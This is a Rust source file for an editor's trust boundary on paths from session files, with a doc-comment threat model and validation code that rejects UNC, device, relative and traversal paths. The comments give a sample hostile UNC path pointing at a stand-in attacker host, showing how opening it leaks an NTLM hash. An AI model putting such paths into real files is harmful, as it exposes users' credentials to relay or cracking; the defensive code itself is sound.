//! The trust boundary around paths that came out of a session file.
//!
//! `AGENTS.md` requires our own config and session files be treated as untrusted input, and names
//! the precedent: Notepad++ shipped three consecutive path-traversal bypasses in 2026 by patching
//! symptoms instead of the boundary.
//!
//! # The threat, concretely
//!
//! This editor never launches a process, so the Notepad++ failure mode — a config string reaching a
//! command line — does not exist here. The realistic attack on Windows is different and worse than
//! traversal:
//!
//! **A session file naming a UNC path causes an outbound SMB connection the moment the tab is
//! opened**, and Windows will attempt NTLM authentication to that host automatically. That leaks a
//! hash for offline cracking or relay, with no dialog and nothing on screen. `\\evil.example\a\x.md`
//! is all it takes. The device namespace (`\\.\pipe\…`) is the same shape of problem: reads that
//! block, or touch a device rather than a file.
//!
//! So the rule is **anything beginning with `\\` is refused**, along with relative paths, `..`
//! components, and anything that is not an existing regular file.
//!
//! # What is deliberately not defended
//!
//! A symlink that resolves to a device. Defending it means either rejecting all symlinks, which is
//! user-hostile, or racing the filesystem between check and open. It is also a much weaker position
//! for an attacker: writing the session file already requires write access to the user's local app
//! data, and anyone holding that can do considerably worse than make us read a pipe.

use std::path::{Component, Path, PathBuf};

/// Why a path from a session file was refused.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
#[non_exhaustive]
pub enum PathRejected {
    /// Not an absolute path.
    ///
    /// A relative path in a session file would resolve against whatever directory the editor
    /// happened to be launched from, which is not a thing to guess about.
    #[error("{0} is not absolute")]
    NotAbsolute(PathBuf),

    /// A UNC or device path.
    #[error("{0} is a network or device path, which this editor will not open from a session file")]
    NetworkOrDevice(PathBuf),

    /// Contains a `..` component.
    #[error("{0} contains a parent-directory component")]
    Traversal(PathBuf),

    /// Does not exist, or is not a regular file.
    #[error("{0} is not an existing file")]
    NotAFile(PathBuf),
}

impl PathRejected {
    /// The path that was refused.
    #[must_use]
    pub fn path(&self) -> &Path {
        match self {
            Self::NotAbsolute(p)
            | Self::NetworkOrDevice(p)
            | Self::Traversal(p)
            | Self::NotAFile(p) => p,
        }
    }
}

/// Checks a path that came from a session file, before anything opens it.
///
/// Ordered cheapest first, and the filesystem is touched last: a malformed session file should be
/// rejected on its shape without a syscall per entry.
///
/// # Errors
///
/// [`PathRejected`], naming which rule the path broke.
pub fn validate(path: &Path) -> Result<(), PathRejected> {
    // Checked on the *given* string rather than after canonicalisation: `fs::canonicalize` returns
    // `\\?\C:\…` on Windows, which would make every legitimate path look like a device path.
    if starts_with_double_separator(path) {
        return Err(PathRejected::NetworkOrDevice(path.to_path_buf()));
    }

    if !path.is_absolute() {
        return Err(PathRejected::NotAbsolute(path.to_path_buf()));
    }

    if path
        .components()
        .any(|component| component == Component::ParentDir)
    {
        return Err(PathRejected::Traversal(path.to_path_buf()));
    }

    // Last, because it is the only rule that costs a syscall. `metadata` follows symlinks, which is
    // wanted: a link to a real file is a real file.
    match std::fs::metadata(path) {
        Ok(metadata) if metadata.is_file() => Ok(()),
        _ => Err(PathRejected::NotAFile(path.to_path_buf())),
    }
}

/// Whether the path begins with two separators, which on Windows means UNC or the device namespace.
///
/// Done on the raw string. `Path::components` normalises the prefix away on Windows and reports
/// nothing distinguishable on other platforms, so both would miss it.
fn starts_with_double_separator(path: &Path) -> bool {
    let text = path.as_os_str().to_string_lossy();
    let mut characters = text.chars();
    matches!(
        (characters.next(), characters.next()),
        (Some('\\'), Some('\\')) | (Some('/'), Some('/'))
    )
}
